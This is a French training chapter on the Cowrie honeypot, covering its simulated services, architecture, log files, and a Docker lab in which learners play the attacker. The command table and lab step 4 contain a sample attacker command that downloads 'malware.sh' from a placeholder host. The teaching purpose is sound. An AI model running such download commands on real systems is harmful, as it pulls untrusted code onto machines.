# CHAPITRE 02 – Présentation de Cowrie

---

## 1. Objectifs pédagogiques

À l’issue de ce chapitre, l’apprenant sera capable de :

* Comprendre ce qu’est Cowrie et en quoi il diffère des autres honeypots
* Identifier les composants et les services simulés par Cowrie
* Expliquer l’architecture de base de Cowrie
* Se repérer dans les répertoires et fichiers clés du projet
* Tester le comportement du honeypot en environnement local isolé

---

## 2. Partie théorique

### 2.1. Qu’est-ce que Cowrie ?

Cowrie est un **honeypot interactif à forte interaction**, écrit en Python. Il simule un service SSH et/ou Telnet, ainsi qu’un **faux système Linux** complet.

Objectif : **piéger les attaquants automatisés ou humains** et enregistrer leurs actions de manière détaillée.

---

### 2.2. Historique du projet

* **2010–2015 : Kippo** – premier honeypot SSH interactif
* **2015 : Cowrie** – fork de Kippo, maintenu activement avec de nombreuses améliorations :

  * Support Telnet
  * Simulation de fichiers réalistes
  * Intégration d’un faux shell plus complet
  * Support SCP, SFTP, fichiers uploadés, etc.

---

### 2.3. Services simulés

Cowrie simule **de manière crédible** :

* Un **serveur SSH (port 2222)** ou **Telnet (port 2223)** – configurables
* Un **shell Unix** (limité mais réaliste : `ls`, `cd`, `wget`, `cat`, etc.)
* Un **système de fichiers** (personnalisable avec arborescence fictive)
* Un **support de transfert de fichiers** :

  * Téléversement (`scp`, `sftp`)
  * Téléchargement (`wget`, `curl`)
* Un **système de session isolée par IP** avec horodatage, logs, et replay

---

### 2.4. Architecture technique de Cowrie

**Composants principaux** :

* `cowrie.cfg` : configuration principale (ports, services, utilisateurs, etc.)
* `honeyfs/` : système de fichiers factice présenté aux attaquants
* `ttylog/` : journalisation des sessions brutes (format binaire + relecture possible)
* `log/cowrie.json` : journalisation structurée JSON pour analyse
* `cowrie/` : code source Python (Twisted pour le réseau)

**Flux de fonctionnement** :

1. L’attaquant tente de se connecter en SSH/Telnet
2. Cowrie accepte la connexion et enregistre l’identifiant/mot de passe
3. Un faux shell est présenté à l’attaquant
4. Toute commande est enregistrée ligne par ligne
5. Fichiers téléversés sont capturés et stockés dans `dl/`
6. Fin de session = log complet disponible (replay possible)

---

### 2.5. Exemples de commandes gérées par Cowrie

| Commande                             | Résultat simulé                                      |
| ------------------------------------ | ---------------------------------------------------- |
| `ls -al /etc`                        | Faux listing du répertoire `/etc`                    |
| `wget http://example.com/malware.sh` | Téléchargement réel dans `dl/`                       |
| `echo hello > test.txt`              | Écriture dans fichier fictif                         |
| `exit`                               | Fin de session                                       |
| `uname -a`                           | Réponse personnalisable (ex. : Linux Debian 4.19...) |

**À noter :** Cowrie ne permet **aucune exécution réelle** des commandes sur le système hôte. Il n’y a pas de prise de contrôle possible de la machine qui héberge Cowrie (si correctement isolée).

---

## 3. Avantages de Cowrie

* Très réaliste pour un attaquant non expert
* Fort volume de données collectées (IP, username/password, commandes, fichiers)
* Adapté aux études statistiques ou Threat Intelligence
* Facile à intégrer avec des outils de SIEM (ELK, Wazuh)
* Conteneurisable (Docker), déploiement rapide

---

## 4. Travaux Pratiques

### TP-02 : Observation du comportement de Cowrie

**Objectif** : Tester les fonctionnalités de base de Cowrie via un container Docker pour éviter les risques.

#### Étapes :

1. Cloner le dépôt officiel de Cowrie :

```bash
git clone https://github.com/cowrie/cowrie.git
cd cowrie
```

2. Lancer un conteneur Docker préconfiguré :

```bash
docker build -t cowrie .
docker run -d --name cowrie -p 2222:2222 cowrie
```

3. Se connecter en SSH :

```bash
ssh root@localhost -p 2222
```

> Mot de passe bidon (ex : `123456` ou `toor`)

4. Essayer quelques commandes :

```bash
ls /bin
uname -a
cd /etc
wget http://example.com/malware.sh
```

5. Observer les logs :

```bash
cat log/cowrie.json | jq .
ls dl/
```

6. Arrêter le container :

```bash
docker stop cowrie
docker rm cowrie
```

---

## 5. Questions de révision

1. Quelle est la différence principale entre Cowrie et un honeypot à faible interaction ?
2. Quels fichiers de Cowrie contiennent les logs des commandes tapées ?
3. Pourquoi Cowrie est-il utile pour la collecte d’indicateurs de compromission ?
4. Peut-on exécuter une commande système réelle depuis Cowrie ?
5. Quels sont les risques d’exposer Cowrie sans l’isoler ?

---

## 6. Ressources complémentaires

* Documentation officielle : [https://cowrie.readthedocs.io/](https://cowrie.readthedocs.io/)
* Projet GitHub : [https://github.com/cowrie/cowrie](https://github.com/cowrie/cowrie)
* Exemple de replay session : `bin/playlog.py log/tty/ttylog.20250704`
* Outils d’analyse de logs JSON : `jq`, `Python scripts`, `Kibana`
